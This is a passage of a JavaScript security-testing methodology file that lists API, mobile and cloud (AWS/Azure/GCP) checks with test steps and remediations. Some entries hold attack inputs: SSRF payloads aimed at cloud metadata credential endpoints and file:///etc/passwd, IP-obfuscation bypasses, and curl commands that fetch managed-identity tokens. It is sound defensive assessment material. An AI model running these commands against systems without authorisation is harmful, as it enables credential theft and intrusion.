      {
        name: "Automated Account Creation",
        description: "Test whether account registration can be automated to create bulk accounts.",
        test: "Script account creation: POST /api/v1/register in loop with generated data; check for CAPTCHA",
        remediation: "CAPTCHA, email verification, rate limiting, device fingerprinting"
      },
      {
        name: "Scalping / Inventory Manipulation",
        description: "Test whether the purchase flow can be automated to buy limited-availability items at scale.",
        test: "Automate add-to-cart and checkout flow; test cart reservation manipulation",
        remediation: "Purchase limits, queue systems, bot detection, CAPTCHA on checkout"
      },
      {
        name: "Content Scraping Prevention",
        description: "Test whether API data can be bulk-scraped without rate limiting or bot detection.",
        test: "Script sequential API calls to extract all listings/products/users; measure rate limiting",
        remediation: "Rate limiting, pagination controls, bot detection, data access quotas"
      },
      {
        name: "Automated Comment/Review Spam",
        description: "Test whether review and comment submission can be automated for spam campaigns.",
        test: "Automate POST requests to review/comment endpoints; test content filtering and rate limits",
        remediation: "Rate limiting, content moderation, CAPTCHA, reputation systems"
      },
      {
        name: "Coupon/Promo Code Bruteforcing",
        description: "Test whether promotional codes can be bruteforced due to predictable patterns or missing rate limits.",
        test: "Bruteforce coupon codes: POST /api/v1/apply-coupon with generated codes; check rate limiting",
        remediation: "High-entropy codes, rate limiting, monitoring for bruteforce patterns"
      },
      {
        name: "Reservation System Abuse",
        description: "Test whether reservation systems can be abused to block availability for other users.",
        test: "Create many reservations without completing them; test cancellation limits and hold expiration",
        remediation: "Reservation timeouts, limits per user, confirmation requirements"
      },
      {
        name: "Vote Manipulation",
        description: "Test whether voting or rating systems can be manipulated through automated API calls.",
        test: "Automate voting: POST /api/v1/vote in loop; test with multiple sessions/IPs",
        remediation: "One vote per user with server-side enforcement, anomaly detection"
      },
      {
        name: "Referral Program Abuse",
        description: "Test whether referral programs can be gamed through automated self-referrals.",
        test: "Create accounts and use own referral code; test referral validation and reward limits",
        remediation: "Referral verification, device fingerprinting, reward limits and review periods"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API7: Server Side Request Forgery
  // -------------------------------------------------------------------------
  {
    category: "API7: Server-Side Request Forgery",
    checks: [
      {
        name: "Cloud Metadata Access",
        description: "Test SSRF to access cloud provider metadata endpoints for credential theft.",
        test: "Submit URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        remediation: "Block metadata IP ranges, use IMDSv2, network-level restrictions"
      },
      {
        name: "Internal Service Access",
        description: "Test SSRF to access internal services not exposed to the internet.",
        test: "Submit URLs: http://localhost:8080/admin, http://internal-service:3000/health, http://10.0.0.1:8080",
        remediation: "URL allowlisting, block private IP ranges, DNS rebinding protection"
      },
      {
        name: "Protocol Smuggling",
        description: "Test SSRF with different URL protocols to access local files or services.",
        test: "Submit URLs: file:///etc/passwd, gopher://localhost:25/, dict://localhost:11211/",
        remediation: "Protocol allowlisting (http/https only), URL scheme validation"
      },
      {
        name: "DNS Rebinding",
        description: "Test for DNS rebinding attacks that bypass IP-based SSRF protections.",
        test: "Use DNS rebinding service that alternates between public and private IPs",
        remediation: "Resolve DNS and validate IP before making request, pin DNS results"
      },
      {
        name: "SSRF via Redirect",
        description: "Test whether SSRF protections can be bypassed through HTTP redirects to internal URLs.",
        test: "Submit URL to attacker server that 302 redirects to http://169.254.169.254/",
        remediation: "Do not follow redirects, or validate each redirect destination"
      },
      {
        name: "Blind SSRF Detection",
        description: "Test for blind SSRF where the response is not returned but the request is still made.",
        test: "Submit URLs pointing to Burp Collaborator or interactsh to detect outbound requests",
        remediation: "Same mitigations as regular SSRF, monitor outbound connections"
      },
      {
        name: "SSRF via Image/File Processing",
        description: "Test file processing features (image resize, PDF generation, URL preview) for SSRF.",
        test: "Upload SVG with external entity, submit URL for preview/screenshot, embed URLs in documents",
        remediation: "Sandboxed file processing, no external resource loading, URL validation"
      },
      {
        name: "SSRF IP Bypass Techniques",
        description: "Test various IP representation bypasses for SSRF protections.",
        test: "Test: 0x7f000001, 017700000001, 2130706433, 127.1, 0:0:0:0:0:ffff:127.0.0.1, [::1]",
        remediation: "Normalize IP addresses before comparison, use robust IP parsing libraries"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API8: Security Misconfiguration
  // -------------------------------------------------------------------------
  {
    category: "API8: Security Misconfiguration",
    checks: [
      {
        name: "Missing Security Headers",
        description: "Test for missing or misconfigured security headers in API responses.",
        test: "curl -sI https://<target>/api/v1/health | grep -iE 'X-Content-Type|Strict-Transport|Content-Security'",
        remediation: "Configure all security headers: HSTS, CSP, X-Content-Type-Options, X-Frame-Options"
      },
      {
        name: "Verbose Error Messages",
        description: "Test whether API errors reveal stack traces, database details, or internal paths.",
        test: "Send malformed requests, wrong content types, invalid parameters and analyze error responses",
        remediation: "Generic error messages in production, log detailed errors server-side only"
      },
      {
        name: "Debug Endpoints Exposed",
        description: "Test for exposed debug, profiling, or monitoring endpoints in production.",
        test: "Check: /debug/, /actuator/, /metrics, /health, /info, /env, /configprops, /trace, /heapdump",
        remediation: "Disable debug endpoints in production, restrict to internal network"
      },
      {
        name: "CORS Misconfiguration",
        description: "Test CORS configuration for overly permissive policies that allow unauthorized cross-origin access.",
        test: "curl -sI -H 'Origin: https://evil.com' https://<target>/api/v1/data | grep Access-Control",
        remediation: "Strict origin allowlist, no wildcard with credentials, validate Origin header"
      },
      {
        name: "TLS Configuration",
        description: "Test TLS configuration for weak protocols, ciphers, and certificate issues.",
        test: "testssl.sh https://<target>/ --severity HIGH",
        remediation: "TLS 1.2+ only, strong cipher suites, valid certificates, HSTS"
      },
      {
        name: "Default API Keys and Tokens",
        description: "Test for default API keys, tokens, or credentials that are shipped with the application.",
        test: "Search docs, GitHub, and source code for default keys; test common default values",
        remediation: "No default credentials, force key generation on first setup"
      },
      {
        name: "Unnecessary HTTP Methods",
        description: "Test for unnecessary HTTP methods enabled on the API server.",
        test: "curl -s -X OPTIONS https://<target>/api/ -I | grep Allow",
        remediation: "Disable unused HTTP methods (TRACE, OPTIONS if not needed for CORS)"
      },
      {
        name: "API Inventory Management",
        description: "Test for undocumented, deprecated, or shadow API endpoints that may lack proper security.",
        test: "Compare documented endpoints with discovered endpoints; test /api/v1/, /api/v2/, /api/beta/",
        remediation: "Maintain API inventory, deprecate old versions, consistent security across versions"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API9: Improper Inventory Management
  // -------------------------------------------------------------------------
  {
    category: "API9: Improper Inventory Management",
    checks: [
      {
        name: "Old API Version Discovery",
        description: "Test for accessible older API versions that may have weaker security controls.",
        test: "Test /api/v1/, /api/v2/, /api/v3/ -- compare auth requirements and data exposure",
        remediation: "Decommission old API versions, redirect to current version"
      },
      {
        name: "Staging Environment Exposure",
        description: "Test for accessible staging or development environments that may have weaker security.",
        test: "Test: staging-api.<domain>, dev-api.<domain>, api-staging.<domain>, sandbox.<domain>",
        remediation: "Restrict staging environments to VPN/internal, use separate credentials"
      },
      {
        name: "API Documentation Exposure",
        description: "Test for exposed API documentation that reveals internal endpoints and data models.",
        test: "Check: /swagger/, /swagger-ui/, /api-docs/, /openapi.json, /graphql with introspection",
        remediation: "Restrict API documentation access in production, disable introspection"
      },
      {
        name: "Shadow API Detection",
        description: "Discover shadow or rogue API endpoints deployed without proper security review.",
        test: "Analyze network traffic, JavaScript files, and mobile apps for undocumented API calls",
        remediation: "API gateway for all traffic, regular API audits, automated API discovery"
      },
      {
        name: "Third-Party API Integration Security",
        description: "Test security of third-party API integrations including credential storage and data handling.",
        test: "Review third-party API keys in responses, test webhook endpoints, check callback validation",
        remediation: "Secure credential storage, validate callbacks, minimize data shared with third parties"
      },
      {
        name: "GraphQL Introspection",
        description: "Test whether GraphQL introspection is enabled in production revealing the complete API schema.",
        test: "POST /graphql with query: { __schema { types { name fields { name type { name } } } } }",
        remediation: "Disable introspection in production, implement query allowlisting"
      },
      {
        name: "Beta Feature Exposure",
        description: "Test for accessible beta or experimental features that may have incomplete security controls.",
        test: "Test headers: X-Feature-Flag, X-Beta, parameters: ?beta=true, ?feature=new",
        remediation: "Feature flags validated server-side, beta features require authorization"
      },
      {
        name: "Deprecated Endpoint Usage",
        description: "Identify deprecated endpoints still accessible that may use outdated security patterns.",
        test: "Compare current API docs with historical docs; test deprecated paths from changelogs",
        remediation: "Remove deprecated endpoints, implement sunset headers and migration guides"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API10: Unsafe Consumption of APIs
  // -------------------------------------------------------------------------
  {
    category: "API10: Unsafe Consumption of APIs",
    checks: [
      {
        name: "Third-Party Data Validation",
        description: "Test whether data received from third-party APIs is validated before use.",
        test: "If possible, intercept and modify third-party API responses with injection payloads",
        remediation: "Validate and sanitize all data from third-party APIs before processing"
      },
      {
        name: "Webhook Payload Validation",
        description: "Test whether incoming webhook payloads are properly validated and authenticated.",
        test: "Send forged webhook payloads to webhook endpoints; test signature validation",
        remediation: "Validate webhook signatures, verify source IP, validate payload schema"
      },
      {
        name: "Redirect Following in API Calls",
        description: "Test whether the API blindly follows redirects from third-party services leading to SSRF.",
        test: "If API calls external URLs, test with redirect to internal addresses",
        remediation: "Limit redirect following, validate each redirect destination"
      },
      {
        name: "Certificate Validation",
        description: "Test whether the API properly validates TLS certificates when connecting to external services.",
        test: "Intercept third-party API calls and present invalid/self-signed certificates",
        remediation: "Strict TLS certificate validation for all outbound connections"
      },
      {
        name: "Data Injection via Third-Party",
        description: "Test whether third-party data can be used for injection attacks (SQL, XSS, command) in the application.",
        test: "If third-party data is displayed or processed, test with injection payloads in third-party fields",
        remediation: "Treat all third-party data as untrusted, apply same validation as user input"
      },
      {
        name: "Third-Party Rate Limit Handling",
        description: "Test how the application handles third-party API rate limits and failures.",
        test: "Trigger high volumes of requests that cause third-party rate limiting; observe error handling",
        remediation: "Implement circuit breakers, retry with backoff, graceful degradation"
      },
      {
        name: "Supply Chain API Security",
        description: "Test the security of the API supply chain including SDK versions and dependency vulnerabilities.",
        test: "Audit API client libraries and SDKs for known vulnerabilities; check update policy",
        remediation: "Regular dependency updates, vulnerability scanning, pinned versions with verification"
      },
      {
        name: "Cross-Service Authentication",
        description: "Test how authentication credentials are handled between the application and consumed APIs.",
        test: "Check if API keys/tokens for third-party services are exposed in responses or client-side code",
        remediation: "Server-side proxy for third-party API calls, never expose third-party credentials to clients"
      }
    ]
  }
];

// -----------------------------------------------------------------------------
// 5. MOBILE_METHODOLOGY -- Mobile Application Testing (8 categories)
// -----------------------------------------------------------------------------

const MOBILE_METHODOLOGY = [
  {
    category: "Data Storage",
    checks: [
      {
        name: "Insecure Local Storage",
        description: "Check for sensitive data stored in plaintext in local databases, SharedPreferences, or NSUserDefaults.",
        tool: "objection, Frida, adb",
        platform: "Android / iOS"
      },
      {
        name: "Keychain/Keystore Usage",
        description: "Verify that sensitive data is stored using platform-provided secure storage (Keychain on iOS, Keystore on Android).",
        tool: "objection, Keychain-dumper",
        platform: "Android / iOS"
      },
      {
        name: "Backup Data Exposure",
        description: "Check whether sensitive data is included in device backups (iCloud, iTunes, ADB backups).",
        tool: "adb backup, idevicebackup2",
        platform: "Android / iOS"
      },
      {
        name: "Clipboard Data Leakage",
        description: "Test whether sensitive data copied to clipboard persists and is accessible to other applications.",
        tool: "objection, Frida",
        platform: "Android / iOS"
      },
      {
        name: "Log File Analysis",
        description: "Check application logs for sensitive data exposure including credentials, tokens, and PII.",
        tool: "adb logcat, Console.app",
        platform: "Android / iOS"
      },
      {
        name: "SQLite Database Security",
        description: "Examine SQLite databases for unencrypted sensitive data and SQL injection in local queries.",
        tool: "sqlite3, objection",
        platform: "Android / iOS"
      },
      {
        name: "Cache Data Review",
        description: "Review HTTP cache, web view cache, and application cache for sensitive data persistence.",
        tool: "objection, Frida, file browser",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Network Communication",
    checks: [
      {
        name: "Certificate Pinning Bypass",
        description: "Test whether SSL certificate pinning is implemented and if it can be bypassed.",
        tool: "Frida, objection, SSLKillSwitch2",
        platform: "Android / iOS"
      },
      {
        name: "Cleartext Traffic Detection",
        description: "Identify any network communication using unencrypted HTTP or other cleartext protocols.",
        tool: "mitmproxy, Burp Suite, tcpdump",
        platform: "Android / iOS"
      },
      {
        name: "TLS Version and Cipher Suite",
        description: "Verify that the app enforces minimum TLS 1.2 and uses strong cipher suites.",
        tool: "Burp Suite, mitmproxy, testssl.sh",
        platform: "Android / iOS"
      },
      {
        name: "Man-in-the-Middle Testing",
        description: "Perform MitM attacks to intercept and analyze API communications for sensitive data.",
        tool: "Burp Suite, mitmproxy, Charles Proxy",
        platform: "Android / iOS"
      },
      {
        name: "WebSocket Security",
        description: "Test WebSocket connections for authentication, encryption, and input validation.",
        tool: "Burp Suite, mitmproxy",
        platform: "Android / iOS"
      },
      {
        name: "Third-Party SDK Communication",
        description: "Analyze network traffic from third-party SDKs for data leakage and insecure communication.",
        tool: "mitmproxy, Wireshark",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Authentication",
    checks: [
      {
        name: "Biometric Authentication Bypass",
        description: "Test whether biometric authentication (fingerprint, face ID) can be bypassed.",
        tool: "Frida, objection",
        platform: "Android / iOS"
      },
      {
        name: "Local Authentication Bypass",
        description: "Test whether local PIN or pattern authentication can be bypassed through runtime manipulation.",
        tool: "Frida, objection",
        platform: "Android / iOS"
      },
      {
        name: "Token Storage Security",
        description: "Verify that authentication tokens are stored securely and not accessible to other applications.",
        tool: "objection, Frida, adb",
        platform: "Android / iOS"
      },
      {
        name: "Session Management",
        description: "Test session handling including timeout, token refresh, and concurrent session management.",
        tool: "Burp Suite, mitmproxy",
        platform: "Android / iOS"
      },
      {
        name: "OAuth Implementation",
        description: "Test OAuth/OIDC implementation for redirect URI validation, PKCE usage, and token handling.",
        tool: "Burp Suite, Custom scripts",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Binary Protection",
    checks: [
      {
        name: "Root/Jailbreak Detection",
        description: "Test root/jailbreak detection mechanisms and attempt to bypass them.",
        tool: "Frida, objection, Magisk Hide",
        platform: "Android / iOS"
      },
      {
        name: "Code Obfuscation",
        description: "Assess the level of code obfuscation to determine if business logic can be easily reversed.",
        tool: "jadx, Hopper, Ghidra, IDA Pro",
        platform: "Android / iOS"
      },
      {
        name: "Debugger Detection",
        description: "Test anti-debugging mechanisms and attempt to attach debuggers to the running application.",
        tool: "Frida, gdb, lldb",
        platform: "Android / iOS"
      },
      {
        name: "Tampering Detection",
        description: "Test integrity verification mechanisms that detect application tampering or repackaging.",
        tool: "apktool, Frida, objection",
        platform: "Android / iOS"
      },
      {
        name: "Binary Hardening",
        description: "Verify that binary hardening measures are applied (PIE, stack canaries, ARC, ASLR).",
        tool: "checksec, otool, readelf",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Platform Interaction",
    checks: [
      {
        name: "Intent/URL Scheme Hijacking",
        description: "Test for intent hijacking on Android or URL scheme hijacking on iOS that could intercept sensitive data.",
        tool: "Drozer, adb, Frida",
        platform: "Android / iOS"
      },
      {
        name: "Content Provider Security",
        description: "Test exported content providers for unauthorized data access on Android.",
        tool: "Drozer, adb",
        platform: "Android"
      },
      {
        name: "Deep Link Validation",
        description: "Test deep link handling for injection attacks and unauthorized functionality access.",
        tool: "adb, Frida, curl",
        platform: "Android / iOS"
      },
      {
        name: "IPC Mechanism Security",
        description: "Test inter-process communication mechanisms for data leakage and unauthorized access.",
        tool: "Drozer, Frida",
        platform: "Android / iOS"
      },
      {
        name: "Permission Model Review",
        description: "Review requested permissions for excessive or unnecessary access to device resources.",
        tool: "aapt, Manifest analysis",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Reverse Engineering",
    checks: [
      {
        name: "APK/IPA Decompilation",
        description: "Decompile the application binary to analyze source code, hardcoded secrets, and business logic.",
        tool: "jadx, apktool, class-dump, Hopper",
        platform: "Android / iOS"
      },
      {
        name: "Hardcoded Secrets",
        description: "Search decompiled code for hardcoded API keys, passwords, encryption keys, and credentials.",
        tool: "jadx, grep, trufflehog",
        platform: "Android / iOS"
      },
      {
        name: "API Endpoint Discovery",
        description: "Extract API endpoints from the application binary for further testing.",
        tool: "jadx, strings, MobSF",
        platform: "Android / iOS"
      },
      {
        name: "Runtime Manipulation",
        description: "Use runtime instrumentation to modify application behavior, bypass security controls, and extract data.",
        tool: "Frida, objection, Xposed",
        platform: "Android / iOS"
      },
      {
        name: "Encryption Implementation Review",
        description: "Analyze custom encryption implementations for weaknesses and proper key management.",
        tool: "Frida, jadx, Ghidra",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Server-Side",
    checks: [
      {
        name: "API Security Testing",
        description: "Test mobile backend APIs for all OWASP API Top 10 vulnerabilities.",
        tool: "Burp Suite, Postman, curl",
        platform: "Android / iOS"
      },
      {
        name: "Push Notification Security",
        description: "Test push notification implementation for message spoofing and sensitive data exposure.",
        tool: "Burp Suite, FCM/APNs tools",
        platform: "Android / iOS"
      },
      {
        name: "File Upload from Mobile",
        description: "Test file upload functionality from mobile apps for bypasses and malicious file upload.",
        tool: "Burp Suite, mitmproxy",
        platform: "Android / iOS"
      },
      {
        name: "Backend Authorization",
        description: "Test that backend APIs enforce authorization independently of mobile app UI restrictions.",
        tool: "Burp Suite, curl",
        platform: "Android / iOS"
      },
      {
        name: "Rate Limiting on Mobile APIs",
        description: "Test rate limiting on mobile-specific API endpoints to prevent abuse.",
        tool: "Burp Suite, custom scripts",
        platform: "Android / iOS"
      }
    ]
  },
  {
    category: "Privacy",
    checks: [
      {
        name: "PII Data Collection",
        description: "Review what personally identifiable information is collected and whether it aligns with the privacy policy.",
        tool: "mitmproxy, Burp Suite, static analysis",
        platform: "Android / iOS"
      },
      {
        name: "Analytics and Tracking",
        description: "Identify analytics SDKs and tracking mechanisms, verify data sent aligns with privacy commitments.",
        tool: "mitmproxy, Charles Proxy",
        platform: "Android / iOS"
      },
      {
        name: "Device Fingerprinting",
        description: "Identify device fingerprinting techniques and assess privacy implications.",
        tool: "Frida, network traffic analysis",
        platform: "Android / iOS"
      },
      {
        name: "Data Retention",
        description: "Test whether user data is properly deleted when the user requests account deletion.",
        tool: "API testing, database review",
        platform: "Android / iOS"
      },
      {
        name: "Screenshot Prevention",
        description: "Test whether the app prevents screenshots on sensitive screens to protect against shoulder surfing.",
        tool: "Device screenshot, Frida",
        platform: "Android / iOS"
      }
    ]
  }
];

// -----------------------------------------------------------------------------
// 6. CLOUD_METHODOLOGY -- Cloud Security Testing (AWS, Azure, GCP)
// -----------------------------------------------------------------------------

const CLOUD_METHODOLOGY = [
  // -------------------------------------------------------------------------
  // AWS
  // -------------------------------------------------------------------------
  {
    provider: "AWS",
    checks: [
      {
        name: "S3 Bucket Misconfiguration",
        description: "Test for publicly accessible S3 buckets with read, write, or list permissions.",
        command: "aws s3 ls s3://<bucket-name> --no-sign-request && aws s3api get-bucket-acl --bucket <bucket-name> --no-sign-request",
        tool: "AWS CLI, S3Scanner",
        risk: "Critical - Data exposure, data manipulation, malware hosting"
      },
      {
        name: "IAM Policy Analysis",
        description: "Analyze IAM policies for overly permissive permissions, wildcard actions, and privilege escalation paths.",
        command: "aws iam list-users && aws iam list-policies --only-attached && aws iam get-policy-version --policy-arn <arn> --version-id <v>",
        tool: "AWS CLI, Pacu, Cloudsplaining",
        risk: "High - Unauthorized access, privilege escalation"
      },
      {
        name: "EC2 Instance Metadata",
        description: "Test for SSRF vulnerabilities that expose EC2 instance metadata including IAM credentials.",
        command: "curl http://169.254.169.254/latest/meta-data/ && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        tool: "curl, custom SSRF payloads",
        risk: "Critical - Credential theft, lateral movement"
      },
      {
        name: "Security Group Analysis",
        description: "Review security groups for overly permissive inbound rules exposing services to the internet.",
        command: "aws ec2 describe-security-groups --filters 'Name=ip-permission.cidr,Values=0.0.0.0/0' --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName,Rules:IpPermissions}'",
        tool: "AWS CLI, Prowler",
        risk: "High - Unauthorized network access to internal services"
      },
      {
        name: "CloudTrail Logging Verification",
        description: "Verify that CloudTrail is enabled and properly configured for all regions and management events.",
        command: "aws cloudtrail describe-trails && aws cloudtrail get-trail-status --name <trail-name>",
        tool: "AWS CLI, Prowler",
        risk: "High - Missing audit trail, inability to detect attacks"
      },
      {
        name: "Lambda Function Security",
        description: "Review Lambda function configurations for exposed environment variables, overly permissive roles, and public access.",
        command: "aws lambda list-functions && aws lambda get-function --function-name <name> && aws lambda get-policy --function-name <name>",
        tool: "AWS CLI, Pacu",
        risk: "High - Code exposure, credential leakage, unauthorized execution"
      },
      {
        name: "RDS Public Accessibility",
        description: "Check for RDS instances that are publicly accessible from the internet.",
        command: "aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].{ID:DBInstanceIdentifier,Engine:Engine,Endpoint:Endpoint.Address}'",
        tool: "AWS CLI, Prowler",
        risk: "Critical - Database exposure, data breach"
      },
      {
        name: "KMS Key Policy Review",
        description: "Review KMS key policies for overly permissive access that could allow unauthorized decryption.",
        command: "aws kms list-keys && aws kms get-key-policy --key-id <key-id> --policy-name default",
        tool: "AWS CLI",
        risk: "High - Unauthorized data decryption"
      },
      {
        name: "EBS Volume Encryption",
        description: "Verify that EBS volumes are encrypted at rest to protect data on persistent storage.",
        command: "aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`].{ID:VolumeId,State:State,Size:Size}'",
        tool: "AWS CLI, Prowler",
        risk: "Medium - Data exposure from unencrypted volumes"
      },
      {
        name: "SNS/SQS Public Access",
        description: "Check for publicly accessible SNS topics and SQS queues that could leak sensitive messages.",
        command: "aws sns list-topics && aws sqs list-queues && aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy",
        tool: "AWS CLI",
        risk: "High - Message interception, unauthorized publishing"
      },
      {
        name: "Secrets Manager Audit",
        description: "Audit Secrets Manager for proper rotation, access policies, and usage tracking.",
        command: "aws secretsmanager list-secrets && aws secretsmanager describe-secret --secret-id <id>",
        tool: "AWS CLI",
        risk: "High - Stale credentials, unauthorized access to secrets"
      },
      {
        name: "IAM Privilege Escalation Paths",
        description: "Identify IAM privilege escalation paths through policy manipulation, role assumption, or service exploitation.",
        command: "python3 pacu.py --exec iam__privesc_scan",
        tool: "Pacu, PMapper",
        risk: "Critical - Full account compromise through privilege escalation"
      },
      {
        name: "ECR Repository Public Access",
        description: "Check for publicly accessible Elastic Container Registry repositories exposing container images.",
        command: "aws ecr describe-repositories && aws ecr get-repository-policy --repository-name <name>",
        tool: "AWS CLI",
        risk: "High - Source code exposure, secret leakage from container images"
      },
      {
        name: "GuardDuty Status",
        description: "Verify that GuardDuty is enabled for threat detection across the AWS account.",
        command: "aws guardduty list-detectors && aws guardduty get-detector --detector-id <id>",
        tool: "AWS CLI",
        risk: "Medium - Missing threat detection capability"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Azure
  // -------------------------------------------------------------------------
  {
    provider: "Azure",
    checks: [
      {
        name: "Blob Storage Public Access",
        description: "Test for publicly accessible Azure Blob Storage containers that may expose sensitive data.",
        command: "az storage container list --account-name <name> --query '[?properties.publicAccess!=`none`]' && az storage blob list --container-name <container> --account-name <name> --output table",
        tool: "Azure CLI, MicroBurst",
        risk: "Critical - Data exposure from publicly accessible containers"
      },
      {
        name: "Azure AD Enumeration",
        description: "Enumerate Azure AD users, groups, applications, and service principals for attack surface mapping.",
        command: "az ad user list --query '[].{UPN:userPrincipalName,DisplayName:displayName}' && az ad group list && az ad app list --all",
        tool: "Azure CLI, ROADtools, AzureHound",
        risk: "Medium - Information disclosure enabling further attacks"
      },
      {
        name: "Network Security Group Review",
        description: "Review NSG rules for overly permissive inbound rules from the internet.",
        command: "az network nsg list --query '[].{Name:name,Rules:securityRules[?direction==`Inbound` && access==`Allow` && sourceAddressPrefix==`*`]}'",
        tool: "Azure CLI, ScoutSuite",
        risk: "High - Unauthorized network access to internal resources"
      },
      {
        name: "Key Vault Access Policies",
        description: "Review Azure Key Vault access policies for overly permissive permissions and unauthorized access.",
        command: "az keyvault list && az keyvault show --name <vault-name> --query 'properties.accessPolicies'",
        tool: "Azure CLI",
        risk: "High - Unauthorized access to secrets, keys, and certificates"
      },
      {
        name: "Managed Identity Abuse",
        description: "Test for managed identity abuse by accessing the instance metadata service from compromised VMs.",
        command: "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
        tool: "curl",
        risk: "Critical - Credential theft through managed identity"
      },
      {
        name: "Azure Functions Security",
        description: "Review Azure Functions for exposed keys, public access, and overly permissive managed identities.",
        command: "az functionapp list && az functionapp config appsettings list -n <name> -g <rg> && az functionapp keys list -n <name> -g <rg>",
        tool: "Azure CLI",
        risk: "High - Function keys exposure, unauthorized execution"
      },
      {
        name: "SQL Database Firewall Rules",
        description: "Check Azure SQL database firewall rules for public access and overly broad IP ranges.",
        command: "az sql server firewall-rule list --resource-group <rg> --server <server> --query '[?startIpAddress==`0.0.0.0`]'",
        tool: "Azure CLI",
        risk: "Critical - Database exposure to the internet"
      },
      {
        name: "Activity Log Monitoring",
        description: "Verify that Azure Activity Log is configured with proper retention and alerting for security events.",
        command: "az monitor activity-log list --max-events 50 && az monitor log-profiles list",
        tool: "Azure CLI",
        risk: "Medium - Missing audit trail and security alerting"
      },
      {
        name: "Resource Group Access Control",
        description: "Review resource group RBAC assignments for overly permissive roles and unnecessary access.",
        command: "az role assignment list --resource-group <rg> --query '[].{Principal:principalName,Role:roleDefinitionName,Scope:scope}'",
        tool: "Azure CLI",
        risk: "High - Unauthorized resource access through excessive RBAC"
      },
      {
        name: "Azure DevOps Pipeline Security",
        description: "Review Azure DevOps pipelines for secrets exposure, unsigned templates, and variable group access.",
        command: "az pipelines list --organization <org> --project <project> && az pipelines variable-group list --organization <org> --project <project>",
        tool: "Azure CLI, Azure DevOps",
        risk: "High - CI/CD pipeline compromise, secret leakage"
      },
      {
        name: "Cosmos DB Access Keys",
        description: "Check Cosmos DB for default access key usage and missing firewall rules.",
        command: "az cosmosdb list && az cosmosdb keys list --name <name> --resource-group <rg>",
        tool: "Azure CLI",
        risk: "Critical - Full database access through exposed primary keys"
      },
      {
        name: "Disk Encryption Status",
        description: "Verify that Azure managed disks are encrypted with customer-managed keys or platform keys.",
        command: "az disk list --query '[?encryptionSettingsCollection==null].{Name:name,ResourceGroup:resourceGroup}'",
        tool: "Azure CLI",
        risk: "Medium - Data exposure from unencrypted disks"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // GCP
  // -------------------------------------------------------------------------
  {
    provider: "GCP",
    checks: [
      {
        name: "Cloud Storage Bucket ACLs",
        description: "Test for publicly accessible Cloud Storage buckets with read or write permissions.",
        command: "gsutil ls gs://<bucket-name>/ && gsutil iam get gs://<bucket-name>/ | grep allUsers",
        tool: "gsutil, GCPBucketBrute",
        risk: "Critical - Data exposure from publicly accessible buckets"
      },
      {
        name: "IAM Policy Bindings",
        description: "Review IAM policy bindings for overly permissive roles, especially primitive roles (Editor, Owner).",
        command: "gcloud projects get-iam-policy <project-id> --format=json && gcloud iam roles list --project <project-id>",
        tool: "gcloud CLI, ScoutSuite",
        risk: "High - Excessive permissions enabling lateral movement"
      },
      {
        name: "Compute Instance Metadata",
        description: "Test for metadata server access from compromised instances to obtain service account credentials.",
        command: "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
        tool: "curl",
        risk: "Critical - Service account credential theft"
      },
      {
        name: "Firewall Rules Analysis",
        description: "Review VPC firewall rules for overly permissive ingress rules allowing internet access.",
        command: "gcloud compute firewall-rules list --format='table(name,direction,sourceRanges,allowed)' --filter='sourceRanges=0.0.0.0/0'",
        tool: "gcloud CLI",
        risk: "High - Unauthorized network access to GCP resources"
      },
      {
        name: "Cloud Functions Security",
        description: "Review Cloud Functions for public invocation permissions and exposed environment variables.",
        command: "gcloud functions list && gcloud functions describe <function-name> --format=json && gcloud functions get-iam-policy <function-name>",
        tool: "gcloud CLI",
        risk: "High - Unauthorized function execution, secret exposure"
      },
      {
        name: "Cloud SQL Public IP",
        description: "Check for Cloud SQL instances with public IP addresses and authorized networks including 0.0.0.0/0.",
        command: "gcloud sql instances list --format='table(name,ipAddresses,settings.ipConfiguration.authorizedNetworks)'",
        tool: "gcloud CLI",
        risk: "Critical - Database exposure to the internet"
      },
      {
        name: "Service Account Key Management",
        description: "Audit service account keys for excessive age, unnecessary keys, and proper rotation.",
        command: "gcloud iam service-accounts list && gcloud iam service-accounts keys list --iam-account <sa-email> --format=json",
        tool: "gcloud CLI",
        risk: "High - Stale service account keys enabling unauthorized access"
      },
      {
        name: "Cloud Audit Logs",
        description: "Verify that Cloud Audit Logs are enabled for admin activity and data access across all services.",
        command: "gcloud projects get-iam-policy <project-id> --format=json | jq '.auditConfigs'",
        tool: "gcloud CLI",
        risk: "Medium - Missing audit trail for security investigation"
      },
      {
        name: "GKE Cluster Security",
        description: "Review GKE cluster security configuration including RBAC, network policies, and pod security.",
        command: "gcloud container clusters list && gcloud container clusters describe <cluster> --format=json | jq '{masterAuth,networkPolicy,podSecurityPolicy}'",
        tool: "gcloud CLI, kube-bench",
        risk: "High - Container escape, lateral movement in cluster"
      },
      {
        name: "Secret Manager Access",
        description: "Review Secret Manager access policies and secret rotation configuration.",
        command: "gcloud secrets list && gcloud secrets get-iam-policy <secret-name>",
        tool: "gcloud CLI",
        risk: "High - Unauthorized access to application secrets"
      },
      {
        name: "BigQuery Dataset Access",
        description: "Check BigQuery datasets for public access and overly broad IAM permissions.",
        command: "bq ls --format=json && bq show --format=json <dataset> | jq '.access'",
        tool: "bq CLI",
        risk: "Critical - Data exposure from publicly accessible datasets"
      },
      {
        name: "Pub/Sub Topic Permissions",
        description: "Review Pub/Sub topic and subscription permissions for unauthorized access.",
